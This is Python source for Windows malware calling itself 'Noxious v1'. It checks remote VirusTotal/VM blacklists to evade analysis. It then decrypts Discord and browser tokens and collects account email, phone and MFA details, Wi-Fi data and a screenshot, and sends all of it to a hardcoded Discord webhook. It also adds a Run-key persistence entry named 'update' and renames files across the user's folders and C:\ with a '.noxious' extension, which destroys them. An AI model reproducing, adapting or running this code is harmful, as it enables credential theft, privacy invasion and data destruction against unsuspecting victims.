import requests
import os
import subprocess
import sys
import winreg as reg
import winreg
import socket
import uuid
import wmi
import re

from figgy              import n0x
from datetime           import datetime
from base64             import b64decode
from Crypto.Cipher      import AES
from win32crypt         import CryptUnprotectData
from os                 import getlogin, listdir, getenv
from json               import loads
from re                 import findall
from urllib.request     import Request, urlopen
from subprocess         import Popen, PIPE
from PIL                import ImageGrab


webhook = 'https://discord.com/api/webhooks/1239479003174141962/9Jr8voT_-CwhtwkpGCfgziwm11C4_l8MhWoTJxhsJxRDKKHu_HXgtADPIqxuvt4VkWtt'

# IMPORTANT
# THIS IS AN ANTI DEBUG MEASURE FOR VIRUS TOTAL 
# SENDS AN EMBED TO THE PROVIDED WEBHOOK WITH THE INFORMATION OF THE MACHINE THAT THE MALWARE IS BEING
# EXECUTED ON IF YOU DONT TRUST THIS THEN PLEASE DONT USE 
# THE SRC CODE IS FROM THE FOLLOWING LINK BELOW
# https://github.com/6nz/virustotal-vm-blacklist


# When ever the main Blacklists are updated 
# this feature will automatically update

def getip():
    ip = "None"
    try:
        ip = requests.get("https://api.ipify.org").text
    except:
        pass
    return ip


def get_guid():
    try:
        reg_connection = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
        key_value = winreg.OpenKey(reg_connection, r"SOFTWARE\Microsoft\Cryptography")
        return winreg.QueryValueEx(key_value, "MachineGuid")[0]
    except Exception as e:
        pass


def get_hwguid():
    try:
        reg_connection = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
        key_value = winreg.OpenKey(reg_connection,
                                   r"SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001")
        return winreg.QueryValueEx(key_value, "HwProfileGuid")[0]
    except Exception as e:
        pass

desktop_name = socket.gethostname()
pc_name = os.getenv("UserName")
ip = getip()
serveruser = os.getenv("UserName")
mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
computer = wmi.WMI()
os_info = computer.Win32_OperatingSystem()[0]
os_name = os_info.Name.encode('utf-8').split(b'|')[0]
os_name = f'{os_name}'.replace('b', ' ').replace("'", " ")
gpu = computer.Win32_VideoController()[0].Name
currentplat = os_name
hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
current_baseboard_manufacturer = subprocess.check_output('wmic baseboard get manufacturer').decode().split('\n')[1].strip()
current_diskdrive_serial = subprocess.check_output('wmic diskdrive get serialnumber').decode().split('\n')[1].strip()
current_cpu_serial = subprocess.check_output('wmic cpu get serialnumber').decode().split('\n')[1].strip()
current_bios_serial = subprocess.check_output('wmic bios get serialnumber').decode().split('\n')[1].strip()
current_baseboard_serial = subprocess.check_output('wmic baseboard get serialnumber').decode().split('\n')[1].strip()
hwidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt')
pcnamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt')
pcusernamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt')
iplist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt')
maclist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt')
gpulist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt')
platformlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_platforms.txt')
bios_serial_list = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BIOS_Serial_List.txt')
baseboardmanufacturerlist = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BaseBoard_Manufacturer_List.txt')
baseboardserial_list = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BaseBoard_Serial_List.txt')
cpuserial_list = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/CPU_Serial_List.txt')
diskdriveserial_list = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/DiskDrive_Serial_List.txt')
hwprofileguidlist = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/HwProfileGuid_List.txt')
machineguidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/MachineGuid.txt')
hwguid = f'{get_hwguid()}'.replace('{', ' ').replace('}', ' ')

vt_payload = {
    "embeds": [
        {
            "title": "Virus Total Scan Detected",
            "description": f"IP Address: {ip}",
            "color": 0xffffff,
            "fields": [
                {
                    "name": "Desktop Name",
                    "value": desktop_name,
                    "inline": False
                },
                {
                    "name": "PC Name",
                    "value": pc_name,
                    "inline": False
                }
            ],
            "thumbnail": {
                "url": "https://yt3.googleusercontent.com/ytc/AOPolaTkLuq-p3dtzwLmhVr6cnOYh6PihW76KSu_QYMJ=s900-c-k-c0x00ffffff-no-rj"
            }
        }
    ],
    "username": "Noxious Logs",
    "avatar_url": "https://yt3.googleusercontent.com/ytc/AOPolaTkLuq-p3dtzwLmhVr6cnOYh6PihW76KSu_QYMJ=s900-c-k-c0x00ffffff-no-rj"
}


def virus_total_send():
    response = requests.post(webhook, json=vt_payload)

def listcheck():
    try:
        if hwid in hwidlist.text:
            virus_total_send()
            os._exit(1)
    except:
        os._exit(1)

    try:
        if serveruser in pcusernamelist.text:
            virus_total_send()
            os._exit(1)
    except:
        os._exit(1)

    try:
        if pc_name in pcnamelist.text:
            virus_total_send()
            os._exit(1)
    except:
        os._exit(1)

    try:
        if ip in iplist.text:
            virus_total_send()
            os._exit(1)
    except:
        os._exit(1)

    try:
        if mac in maclist.text:
            virus_total_send()
            os._exit(1)
    except:
        os._exit(1)

    try:
        if gpu in gpulist.text:
            virus_total_send()
            os._exit(1)
    except:
        os._exit(1)

    try:
        if current_diskdrive_serial in diskdriveserial_list:
            virus_total_send()
            os._exit(1)
    except:
        os._exit(1)

    try:
        if current_cpu_serial in cpuserial_list:
            virus_total_send()
            os._exit(1)
    except:
        os._exit(1)

    try:
        if current_baseboard_manufacturer in baseboardmanufacturerlist:
            virus_total_send()
            os._exit(1)
    except:
        os._exit(1)

    try:
        if current_bios_serial in bios_serial_list:
            virus_total_send()
            os._exit(1)
    except:
        os._exit(1)

    try:
        if current_baseboard_serial in baseboardserial_list:
            virus_total_send()
            os._exit(1)
    except:
        os._exit(1)

    try:
        if get_guid() in machineguidlist:
            virus_total_send()
            os._exit(1)
    except:
        os._exit(1)

    try:
        if hwguid in hwprofileguidlist:
            virus_total_send()
            os._exit(1)
    except:
        os._exit(1)
listcheck()


####################### Code End ################################

def sjik():
    pscript = os.path.abspath(sys.argv[0])
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    key_name = "update"

    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, key_name, 0, reg.REG_SZ, pscript)
        reg.CloseKey(key)
    except Exception as e:
        pass

def change_extension(directory, old_ext, new_ext):
    for root, _, files in os.walk(directory):
        for filename in files:
            if filename.endswith(old_ext):
                old_file_path = os.path.join(root, filename)
                new_filename = "??{}".format(new_ext)
                new_file_path = os.path.join(root, new_filename)
                os.rename(old_file_path, new_file_path)

    

def wif():
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout
        else:
            return "Error: Unable to retrieve Wi-Fi information."
    except Exception as e:
        return f"Error: {str(e)}"


def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"

def fig():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip

def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

def get_nox():
    already_check = []
    checker = []
    cleaned = []
    nox = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }

    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                nox.append(values)
                except PermissionError: continue
        for i in nox:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error": continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = fig()
                        pc_username = getenv("UserName")
                        pc_name = getenv("COMPUTERNAME")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                        embed = {
                            "title": user_name,
                            "color": 0x000000,
                            "author": {
                                "name": "Noxious v1 - Made by Resentful",
                                "icon_url": "https://cdn.discordapp.com/attachments/1229552814683062336/1236400257470959796/aliens.png?"
                            },
                            "footer": {
                                "text": "Dev Veal | https://github.com/resentful1"
                            },
                            "fields": [
                                {"name": "User ID", "value": user_id, "inline": True},
                                {"name": "Account Information", "value": f"<a:blackdiamond:856110506670161930> Email: `{email}`\n<a:blackdiamond:856110506670161930> Phone: `{phone}`\n<a:blackdiamond:856110506670161930> 2FA/MFA Enabled: `{mfa_enabled}`\n<a:blackdiamond:856110506670161930> Nitro: `{has_nitro}`\n<a:blackdiamond:856110506670161930> Expires in: `{days_left if days_left else 'None'} day(s)`", "inline": False},
                                {"name": "PC Information", "value": f"<a:blackdiamond:856110506670161930> IP: `{ip}`\n<a:blackdiamond:856110506670161930> Username: `{pc_username}`\n<a:blackdiamond:856110506670161930> PC Name: `{pc_name}`\n<a:blackdiamond:856110506670161930> Platform: `{platform}`", "inline": False},
                                {"name": "Token", "value": f"||{tok}||", "inline": False}
                            ]
                        }
                        payload = {
                            "embeds": [embed]
                        }
                        try:
                            res = requests.post(f'{webhook}', json=payload, headers=headers)
                            if res.status_code == 204:
                                pass
                        except Exception as e:
                            pass
                else: continue
    
    con_info = wif()
    con_embed = {
        "title": "**Wi-Fi Information**",
        "color": 0x000000,
        "fields": [
            {"name": "<a:blackdiamond:856110506670161930> **Wi-Fi Info**", "value": f"```js{con_info}```", "inline": False}
        ]
    }
    con_payload = {
        "embeds": [con_embed]
    }
    con_res = requests.post(f'{webhook}', json=con_payload)
    if con_res.status_code == 204:
        pass

    screenshot = ImageGrab.grab()
    screenshot_path = "screenshot.png"
    screenshot.save(screenshot_path)
    screenshot_embed = {
        "title": "**Screenshot**",
        "color": 0x000000,
        "image": {
            "url": "attachment://" + screenshot_path
        }
    }
    screenshot_payload = {
        "embeds": [screenshot_embed]
    }
    screenshot_files = {
        "file": open(screenshot_path, "rb")
    }
    screenshot_res = requests.post(f'{webhook}', json=screenshot_payload, files=screenshot_files)
    if screenshot_res.status_code == 204:
        pass


if __name__ == '__main__':
    get_nox()
    n0x(webhook)
    os.remove("screenshot.png")
    sjik()
    pc_name = getenv("COMPUTERNAME")
    directories = [f"C:\\Users\\{pc_name}\\Desktop", 
                   f"C:\\Users\\{pc_name}\\Videos",
                   f"C:\\Users\\{pc_name}\\Downloads",
                   f"C:\\Users\\{pc_name}\\Pictures",
                   f"C:\\"] 
    
    old_ext = ".exe", ".png", ".jpg", ".gif", ".mp3", ".mp4", ".py", ".bat","py",".zip",".docs",".pdf", 
    ".txt", ".docx", ".xlsx", ".pptx", ".ppt", ".doc", ".xls", ".odt", ".ods", ".odp", ".rtf", ".avi", 
    ".mov", ".mkv", ".flv", ".wmv", ".swf", ".wav", ".mpg", ".mpeg", ".vob", ".mp4", ".webm", ".m4v", 
    ".flv", ".f4v", ".f4p", ".f4a", ".f4b", ".m4b", ".m4r", ".m4v", ".3gp"
    new_ext = ".noxious"  
    
    for directory in directories:
        change_extension(directory, old_ext, new_ext)
